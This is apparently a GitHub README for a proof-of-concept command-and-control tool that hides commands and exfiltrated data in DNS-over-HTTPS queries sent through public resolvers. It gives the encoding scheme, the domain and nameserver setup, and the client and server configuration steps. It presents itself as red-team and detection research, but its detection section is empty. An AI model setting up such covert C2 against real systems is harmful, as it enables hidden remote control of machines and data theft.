# Dns-over-HTTPS-DOH
This project provides a proof-of-concept implementation of a Command and Control (C2) infrastructure using DNS over HTTPS (DoH). 
DoH C2 allows for covert communication between the C2 server and the infected client machines by leveraging encrypted DNS queries
thereby making the traffic appear legitimate and harder to detect by traditional network monitoring tools.

# Architecture
![image](https://github.com/user-attachments/assets/e0e0c705-e5a2-4934-b265-f70e39ca668b)  

The python program on the client side sends HTTPS request (TCP/443) to DoH Server to resolve a destination domain where the c2 is hosted, e.g send.example.com.co using a  the legit DOH server, json query like https[:]//dns.belnet.be/dns-query?name=google.com &type=TXT  
An attacker can use the part which is between the name and ‘&’ to inject txt record which is not bigger than 512 bytes of size e.g https[:]//dns.belnet.be/dns-query?name=SINGLE-1-K5EE6QKNJEFA====.send.example.com.co&type=TXT  
'SINGLE-1-K5EE6QKNJEFA===='  => the base32 encoded query (K5EE6QKNJEFA====  is basically WHOAMI )  
send.example.com.co => the DNS c2 server  
The belnet.be is instructed to query the send.example.com.co DNS server for the TXT record.  
The DNS server send.example.com.co then returns back txt record in which instructions are send what the client needs to perform next. Bellow is example it the answer section of the response are the instructions the client/malware will execute.  

# Testing and Limitations
This project is intended for educational purposes and authorized security research only. 
Bypassing antivirus software or other security measures is not within the scope of this project. 
It is designed for testing in controlled environments to demonstrate the feasibility and mechanics of using DoH for C2 communication **to test enterprise corporate forward proxy detection and improve any custom build signatures in SIEMs.**

# Features
**Covert Communication**: Utilizes DoH to encode and disguise C2 traffic.

**Command Execution**: Supports remote execution of commands on infected Linux clients.

**Data Exfiltration**: Allows for exfiltration of data through DOH queries.

**Server and Client Implementation**: Includes both C2 server and client components.  

Only google DoH is used.  

# Scenario 1 - Using Public DoH Server
![image](https://github.com/user-attachments/assets/d26b3309-d164-4344-8dcb-94c10e7e6291)

# Initial setup
For client side, linux is recommended but the code was tested on Windows 10 and seem to worked :)  
For server side linux.  

**1. Client Side**  
    Install Python >=3.8 from the official website or your package manager.  
     Install the requests library using pip:    
     **pip install requests**
**2. Server side** only Linux  
    Install the dnslib library using pip
    **pip install dnslib**  

**3. Register domain**  
Example purchasing domain using namecheap.com
![grafik](https://github.com/user-attachments/assets/26f16ed6-1a45-4b1c-8ddc-cac2287eba24)

Follow instructions on the screenshot bellow to setup the NameServer.
Replace the IP and domainname with your purchased domain and server Public IP
![grafik](https://github.com/user-attachments/assets/c9e9f4cf-ac77-4b31-b92d-7bfe28ed93e9)

# Usage
**1. Client side**  

Make sure to change the bellow in the "doh_client.py" to the domain registered in step 3.  

if __name__ == "__main__":
    domain_name = "send.examples.com.co"  # Replace after '**send**' with your domain
    execute_command_from_dns(domain_name)

      
python3 doh_client.py  
Example run 
![grafik](https://github.com/user-attachments/assets/ff8f6724-9985-4411-87f0-7435cad4ad7f)


**2. Server side**  

Make sure to change the IP in the "doh_server.py"  

class DNSDoHServer:
    def __init__(self, host='YOURIP', port=53): # Replace with Your public IP


Example run:
![grafik](https://github.com/user-attachments/assets/dec32aca-60b0-415a-a616-49c14a21906b)

Note instead of the  examples.com.co you should use your domain name  
Run: python3 doh_server.py


# Detection Tips TODO
